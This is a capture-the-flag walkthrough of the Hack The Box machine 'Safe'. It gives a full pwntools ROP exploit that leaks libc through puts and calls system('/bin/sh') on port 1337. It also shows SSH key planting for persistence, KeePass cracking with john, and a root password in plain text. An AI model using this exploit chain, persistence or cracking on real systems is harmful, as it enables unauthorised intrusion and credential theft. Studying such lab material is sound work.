# Nmap
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     08:46:13 up 2 min, 0 users, load average: 0.04, 0.06, 0.02
|   DNSVersionBindReqTCP: 
|     08:46:08 up 2 min, 0 users, load average: 0.05, 0.07, 0.02
|   GenericLines: 
|     08:45:57 up 2 min, 0 users, load average: 0.06, 0.07, 0.02
|     What do you want me to echo back?
|   GetRequest: 
|     08:46:03 up 2 min, 0 users, load average: 0.05, 0.07, 0.02
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions: 
|     08:46:03 up 2 min, 0 users, load average: 0.05, 0.07, 0.02
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help: 
|     08:46:18 up 2 min, 0 users, load average: 0.04, 0.06, 0.02
|     What do you want me to echo back? HELP
|   NULL: 
|     08:45:57 up 2 min, 0 users, load average: 0.06, 0.07, 0.02
|   RPCCheck: 
|     08:46:03 up 2 min, 0 users, load average: 0.05, 0.07, 0.02
|   RTSPRequest: 
|     08:46:03 up 2 min, 0 users, load average: 0.05, 0.07, 0.02
|     What do you want me to echo back? OPTIONS / RTSP/1.0
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     08:46:18 up 2 min, 0 users, load average: 0.04, 0.06, 0.02
|_    What do you want me to echo back?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service
```

# Page check
**Port 80**
![](images/Pasted%20image%2020241218085304.png)
The index page is the original page of service of `Apache debian2`
But from the source code we can found some interesting things
![](images/Pasted%20image%2020250716150630.png)

We can get the `myapp` from `http://10.10.10.147/myapp`

# Port 1337
**Port 1337**
![](images/Pasted%20image%2020250716043123.png)
Let's use `nc` to check what can we get back
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Safe]
└─$ nc 10.10.10.147 1337
 06:56:45 up 6 min,  0 users,  load average: 0.00, 0.00, 0.00
hi

What do you want me to echo back? hi
```
There is nothing interesting here.

# Reverse analysis myapp
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Safe]
└─$ file myapp          
myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped
```
We can use `ghidra` to reverse that
We can find it runs `uptime`, prints a message with `printf`, then gets a message, and puts that same message:
![](images/Pasted%20image%2020250716151339.png)

The binary itself isn't listening on any ports, so I can only assume that some other program is `proxying` its requests for `stdin/stdout`.

`checksec` shows `NX` (Do not allow execution from stack) is enabled, but nothing else:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Safe]
└─$ checksec myapp
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/wither/.cache/.pwntools-cache-3.13/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or /home/wither/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.14.1)
[*] '/home/wither/Templates/htb-labs/Safe/myapp'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
                      
```

I will open the file in gdb with Peda installed. If I try to run the program it seems to fork and exit so I can see the prompt but can't type.
By default, gdb follows the parent, but Peda switches that to the child by default. In this case, for some odd reason, I want to keep using the parent, so I'll set it up like this:
```
gdb-peda$ set follow-fork-mode parent
gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ file myapp
Reading symbols from myapp...
(No debugging symbols found in myapp)
```

Then now I will run the program, and enter the mode, and I get the program crash
```
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7ecead4 (<__GI___libc_write+20>:    cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7f9f580 --> 0x0 
RSI: 0x405260 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...
)
RDI: 0x0 
RBP: 0x41414e4141384141 ('AA8AANAA')
RSP: 0x7fffffffdfb8 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RIP: 0x4011ac (<main+77>:       ret)
R8 : 0xc9 
R9 : 0x0 
R10: 0x4003e0 --> 0x6972700073747570 ('puts')
R11: 0x246 
R12: 0x401070 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe090 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011a1 <main+66>:  call   0x401030 <puts@plt>
   0x4011a6 <main+71>:  mov    eax,0x0
   0x4011ab <main+76>:  leave  
=> 0x4011ac <main+77>:  ret    
   0x4011ad:    nop    DWORD PTR [rax]
   0x4011b0 <__libc_csu_init>:  push   r15
   0x4011b2 <__libc_csu_init+2>:        mov    r15,rdx
   0x4011b5 <__libc_csu_init+5>:        push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdfb8 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0x7fffffffdfc0 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0x7fffffffdfc8 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0x7fffffffdfd0 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0032| 0x7fffffffdfd8 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0040| 0x7fffffffdfe0 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0048| 0x7fffffffdfe8 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0056| 0x7fffffffdff0 ("AuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ac in main ()
```

It gets stuck on `ret` , trying to move the value at the top of the stack to RIP , but that value is not a valid memory address, so it throws `SIGSEGV` .

I can test this by creating a new padding of 120 and then adding 8 b at the end
```
gdb-peda$ pattern_create 120     
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA'
gdb-peda$ r                  
Starting program: /media/sf_CTFs/hackthebox/safe-10.10.10.147/myapp 
[Detaching after vfork from child process 15848]
 14:23:47 up 13 days,  2:08, 32 users,  load average: 1.49, 1.32, 1.15

What do you want me to echo back? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAbbbbbbbb
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAbbbbbbbb

```

The system crashes again, because there are eight b's waiting to be loaded into RIP at the top of the stack:
```
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7ecead4 (<__GI___libc_write+20>:    cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7f9f580 --> 0x0 
RSI: 0x405260 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAbbbbbbbb\n")
RDI: 0x0 
RBP: 0x41414e4141384141 ('AA8AANAA')
RSP: 0x7fffffffdfb8 ("bbbbbbbb")
RIP: 0x4011ac (<main+77>:       ret)
R8 : 0x81 
R9 : 0x0 
R10: 0x4003e0 --> 0x6972700073747570 ('puts')
R11: 0x246 
R12: 0x401070 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe090 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011a1 <main+66>:  call   0x401030 <puts@plt>
   0x4011a6 <main+71>:  mov    eax,0x0
   0x4011ab <main+76>:  leave  
=> 0x4011ac <main+77>:  ret    
   0x4011ad:    nop    DWORD PTR [rax]
   0x4011b0 <__libc_csu_init>:  push   r15
   0x4011b2 <__libc_csu_init+2>:        mov    r15,rdx
   0x4011b5 <__libc_csu_init+5>:        push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdfb8 ("bbbbbbbb")
0008| 0x7fffffffdfc0 --> 0x0 
0016| 0x7fffffffdfc8 --> 0x7fffffffe098 --> 0x7fffffffe3ad ("/media/sf_CTFs/hackthebox/safe-10.10.10.147/myapp")
0024| 0x7fffffffdfd0 --> 0x100040000 
0032| 0x7fffffffdfd8 --> 0x40115f (<main>:      push   rbp)
0040| 0x7fffffffdfe0 --> 0x0 
0048| 0x7fffffffdfe8 --> 0x90f131e252f0111d 
0056| 0x7fffffffdff0 --> 0x401070 (<_start>:    xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ac in main ()
```

# Exploit 
I plan to write the string /bin/sh into .data and then call system() .

Now I just need to find some addresses, and I have an exploit.
In `gdb`, I’ll disassemble main:
```
gdb-peda$ disassemble main 
Dump of assembler code for function main:
   0x000000000040115f <+0>:     push   rbp
   0x0000000000401160 <+1>:     mov    rbp,rsp
   0x0000000000401163 <+4>:     sub    rsp,0x70
   0x0000000000401167 <+8>:     lea    rdi,[rip+0xe9a]        # 0x402008
   0x000000000040116e <+15>:    call   0x401040 <system@plt>
   0x0000000000401173 <+20>:    lea    rdi,[rip+0xe9e]        # 0x402018
   0x000000000040117a <+27>:    mov    eax,0x0
   0x000000000040117f <+32>:    call   0x401050 <printf@plt>
   0x0000000000401184 <+37>:    lea    rax,[rbp-0x70]
   0x0000000000401188 <+41>:    mov    esi,0x3e8
   0x000000000040118d <+46>:    mov    rdi,rax
   0x0000000000401190 <+49>:    mov    eax,0x0
   0x0000000000401195 <+54>:    call   0x401060 <gets@plt>
   0x000000000040119a <+59>:    lea    rax,[rbp-0x70]
   0x000000000040119e <+63>:    mov    rdi,rax
   0x00000000004011a1 <+66>:    call   0x401030 <puts@plt>
   0x00000000004011a6 <+71>:    mov    eax,0x0
   0x00000000004011ab <+76>:    leave  
   0x00000000004011ac <+77>:    ret    
End of assembler dump.

gdb-peda$ x/i 0x401040
   0x401040 <system@plt>:       jmp    QWORD PTR [rip+0x2fda]        # 0x404020 <system@got.plt>
```

Also, we can use `ropper` as `POP RDI gadget`
```
ropper -f myapp | grep rdi
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x000000000040108a: adc dword ptr [rax], eax; mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040119b: lea eax, dword ptr [rbp - 0x70]; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x000000000040119a: lea rax, qword ptr [rbp - 0x70]; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x0000000000401087: mov ecx, 0x4011b0; mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x0000000000401086: mov rcx, 0x4011b0; mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040108d: mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040119e: mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x00000000004010c6: or dword ptr [rdi + 0x404048], edi; jmp rax; 
0x0000000000401090: pop rdi; adc dword ptr [rax], eax; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040120b: pop rdi; ret; 
0x000000000040119c: xchg eax, r8d; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x000000000040119d: nop; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
```

The gadget at `0x40120b` looks perfect.

Then we can write the exploited script here:
Phase 1: Leak the real address of `puts@GLIBC` to calculate the base address of `libc`.

Phase 2: Calculate the address of the /bin/sh string, construct the `ROP` chain of `system("/bin/sh")`, and execute the shell.
```
#!/usr/bin/env python

from pwn import *

context(os="linux", arch="amd64")
#context(log_level='DEBUG')

junk = b"A"*120

got_puts = p64(0x404018)
plt_system = p64(0x401040)
pop_rdi  = p64(0x40120b)
main     = p64(0x40115f)
payload = junk + pop_rdi + got_puts + plt_system + main

p = remote("10.10.10.147", 1337)
p.recvline()
p.sendline(payload)
leaked_puts = u64(p.recvline().strip()[7:-11].ljust(8,b"\x00"))

log.info("Leaked puts address: %x" % leaked_puts)
libc_base = leaked_puts - 0x68f90
log.info("libc_base: %x" % libc_base)

sh = p64(0x161c19 + libc_base)

payload = junk + pop_rdi + sh + plt_system
p.recvline()
p.sendline(payload)
p.interactive()
```

Then we can get the shell as `user`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Safe]
└─$ python3 exploit.py
[+] Opening connection to 10.10.10.147 on port 1337: Done
[*] Leaked puts address: 7f2dfde6ef90
[*] libc_base: 7f2dfde06000
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)

```
There was nothing on this box. No python, no `python3`, no `nc`. But ssh was listening, so I put my public key in the authorized_keys file, then connected via ssh and got a full shell:
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDO0dl48snyfNIrhj7V9tMQpXE5B0uCuiCXQxCdZLYglN70DyHDODd5y6jdo4JhorRyBK7kEguQZErAGWtJOs9Q8Tk6VLE1PmRc+vZMFH7FhM+Bdr6kH3bjHbPvLr/rqwYKCzUB5oYZOAJP9+6azC/SiBdtne0TN7uzTLXIO9+nFvfX6ZEL+Exkc3Tux7BlmatBJAOjvSHY94NXylZzyNM8HKDLp1fR43f64oKDL5odQFumuYDS2PvRRTMcx9NJ8xc1PD2STFd9xXvcpyXnE+WJjbc0s/iq6bgw6FrN7yYEegXolRsLh9jMFQtfJnBExqK2PWMm++UH2U6W4CXdKq1Vjlj+ZbWoC8SM3lL+H2y+wB2xjugQolebG3JS1r6NLGCDygY25ySUskXPdprwPf6vFCQiSdr2EHATwJI3HQMMUyBuEuHawppop60atUcMOhXny0h7//zJ/td6fouJT14KxQ/3f3B/ifXoAmIX8Y15FBxY70qeubV1XE+TnaXaw7IdESxEn5mIl13cIleAv/UFF4fEyXutr3ceDFHE4MOsL4KzynSfNmUMKkkbf+IbVGiJTKrzjzcCPx4KBKkhybmidX3q3LOwXvtltF/7t5/bM9D8JB7rT/3VF4ECtPt9Mr2FbahMz9Uzm1yKcu0sNbx9DFKSVtn2larH+zqh7QU7iQ== test" >> /home/user/.ssh/authorized_keys
```

Then we can use `ssh` to connect it 
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Safe]
└─$ ssh -i ~/.ssh/id_rsa user@10.10.10.147
Linux safe 4.19.0-25-amd64 #1 SMP Debian 4.19.289-2 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Dec  7 20:30:52 2023 from 10.10.14.23
user@safe:~$ 

```


# Root
There are files in the home directory 
```
user@safe:~$ ls -al
total 11284
drwxr-xr-x 3 user user    4096 Jul 26  2022 .
drwxr-xr-x 3 root root    4096 Jul 26  2022 ..
lrwxrwxrwx 1 user user       9 May 13  2019 .bash_history -> /dev/null
-rw-r--r-- 1 user user     220 May 13  2019 .bash_logout
-rw-r--r-- 1 user user    3526 May 13  2019 .bashrc
-rw-r--r-- 1 user user 1907614 May 13  2019 IMG_0545.JPG
-rw-r--r-- 1 user user 1916770 May 13  2019 IMG_0546.JPG
-rw-r--r-- 1 user user 2529361 May 13  2019 IMG_0547.JPG
-rw-r--r-- 1 user user 2926644 May 13  2019 IMG_0548.JPG
-rw-r--r-- 1 user user 1125421 May 13  2019 IMG_0552.JPG
-rw-r--r-- 1 user user 1085878 May 13  2019 IMG_0553.JPG
-rwxr-xr-x 1 user user   16592 May 13  2019 myapp
-rw-r--r-- 1 user user    2446 May 13  2019 MyPasswords.kdbx
-rw-r--r-- 1 user user     675 May 13  2019 .profile
drwx------ 2 user user    4096 Jul 16 02:02 .ssh
-rw------- 1 user user      33 Jul 15 06:51 user.txt
```

We can download `MyPasswords.kdbx` to our local machine and crack it by john
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Safe]
└─$ scp -i ~/.ssh/id_rsa user@10.10.10.147:~/*.kdbx .   
MyPasswords.kdbx                                                                                                                              100% 2446     2.6KB/s   00:00    

┌──(wither㉿localhost)-[~/Templates/htb-labs/Safe]
└─$ scp -i ~/.ssh/id_rsa user@10.10.10.147:~/IMG* . 
IMG_0545.JPG                                                                                                                                  100% 1863KB 155.1KB/s   00:12    
IMG_0546.JPG                                                                                                                                  100% 1872KB 190.0KB/s   00:09    
IMG_0547.JPG                                                                                                                                  100% 2470KB 225.6KB/s   00:10    
IMG_0548.JPG                                                                                                                                  100% 2858KB 259.7KB/s   00:11    
IMG_0552.JPG                                                                                                                                  100% 1099KB 183.1KB/s   00:06    
IMG_0553.JPG                                                                                                                                  100% 1060KB 212.0KB/s   00:05    
```

Then we can use `keepass2john` and john to crack
```
keepass2john MyPasswords.kdbx > MyPasswords.hash  

john MyPasswords.kdbx.john /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt 
Warning: only loading hashes of type "KeePass", but also saw type "tripcode"
Use the "--format=tripcode" option to force loading hashes of that type instead
Warning: only loading hashes of type "KeePass", but also saw type "descrypt"
Use the "--format=descrypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (KeePass [SHA256 AES 32/64 OpenSSL])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bullshit         (MyPasswords)
1g 0:00:01:20 0.47% 2/3 (ETA: 15:46:09) 0.01239g/s 91.21p/s 154.1c/s 154.1C/s emerald..francesco
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

With the password, I can try each image file until I find one that can open the database. I can view the password database using the command line tool `kpcli`. In the `keepass` database, I will find the "Root Password":
```
kpcli --key IMG_0547.JPG --kdb MyPasswords.kdbx
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
MyPasswords/
kpcli:/> cd MyPasswords/
kpcli:/MyPasswords> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
=== Entries ===
0. Root password
kpcli:/MyPasswords> show -f R
Recycle\ Bin/   Root\ password
kpcli:/MyPasswords> show -f Root\ password

 Path: /MyPasswords/
Title: Root password
Uname: root
 Pass: u3v2249dl9ptv465cogl3cnpo3fyhk
  URL:
Notes:
```

Then we can use the credit to get the root shell `root:u3v2249dl9ptv465cogl3cnpo3fyhk`
```
user@safe:~$ su root
Password: 
root@safe:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@safe:/home/user# whoami
root
root@safe:/home/user# 
```


# Description

First of all, I must admit that I am not good at binary reverse engineering. Secondly, I use the Kali Linux virtual machine of the arm64 Mac, so it is really a headache for me to reverse this machine. Although I know some basic gdb and IDA skills, it is really difficult for me to reverse the x86_64 program on the arm64 architecture.

This also tells us that if you want to learn reverse engineering, please don't choose Mac.